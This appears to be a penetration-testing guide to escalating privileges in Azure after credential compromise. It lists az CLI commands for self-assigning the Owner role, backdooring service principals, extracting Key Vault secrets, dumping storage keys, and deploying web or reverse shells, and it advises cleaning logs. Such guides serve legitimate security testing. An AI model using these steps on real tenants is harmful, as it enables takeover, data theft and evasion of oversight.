# Azure Penetration Testing: Exploitation & Privilege Escalation

**🔓 Initial Access via Leaked Azure Credentials**

If you've compromised Azure credentials (e.g., via phishing, dev
machine, GitHub leak, or token abuse), here’s how to pivot and escalate.

------------------------------------------------------------------------

**🧾 Step 1: Identify the Current User / Principal**

Check what identity you're using:

az account show

az ad signed-in-user show

Or via token:

az account get-access-token

This reveals:

- Tenant ID

- Object ID

- User Principal Name

- Subscription ID

------------------------------------------------------------------------

**🚩 Step 2: Determine Assigned Permissions (RBAC)**

List all role assignments in the subscription or resource group:

az role assignment list --all

Focus on the following:

- Roles like **Owner**, **Contributor**, **User Access Administrator**

- Wildcard \* actions

- Custom roles with excessive privileges

------------------------------------------------------------------------

**🧗 Step 3: Privilege Escalation via RBAC Misconfigurations**

**🔥 Common Escalation Vectors in Azure:**

| Permission | Abuse Scenario |
|----|----|
| Microsoft.Authorization/roleAssignments/write | Assign yourself higher privileges |
| Microsoft.Web/sites/write + sourcecontrol | Deploy web shell via Azure Web App |
| Microsoft.Automation/automationAccounts/write | Backdoor via runbooks |
| Microsoft.Compute/virtualMachines/extensions/write | Deploy reverse shell using VM extensions |
| Microsoft.ManagedIdentity/userAssignedIdentities/assign/action | Impersonate privileged identity |
| Microsoft.KeyVault/vaults/secrets/\* | Extract secrets (credentials, tokens) |
| Microsoft.Storage/storageAccounts/listKeys/action | Dump storage account keys and access blobs |

**⚙️ Escalation Example: Assigning Yourself a High-Privilege Role**

If you have permission to assign roles:

az role assignment create \\

--assignee \<your-user-or-SP-object-id\> \\

--role "Owner" \\

--scope /subscriptions/\<sub-id\>

------------------------------------------------------------------------

**🧬 Step 4: Persistence Techniques**

**🛠️ Create a New Service Principal**

If allowed:

az ad sp create-for-rbac --name evil-sp --role Contributor

Or:

az ad sp credential reset --name \<existing-sp-id\>

**🧪 Add Access Keys or Secrets**

If you control a service principal:

az ad sp credential reset --name \<sp-id\> --append

------------------------------------------------------------------------

**🧰 Step 5: Enumerate Roles and Trust Relationships**

**List all roles:**

az role definition list

**Get details of a specific role:**

az role definition list --name "RoleName"

**View App Role Assignments or Group Membership:**

az ad user get-member-groups --id \<user-id\>

az ad group member list --group \<group-id\>

------------------------------------------------------------------------

**🎭 Step 6: Role Assumption via Managed Identity or Automation Abuse**

If you're able to access Managed Identities or linked resources,
escalate using:

- **Runbooks (Azure Automation)**

- **Function App injection**

- **Custom script extensions on VMs**

- **Assigning user-assigned identities to resources**

------------------------------------------------------------------------

**💉 Final Steps: Stealth, Pivoting, and Lateral Movement**

- Enumerate additional tenants/subscriptions:

- az account list --all

- Connect to other environments or backdoor identities

- Clean logs where possible (requires higher privileges)
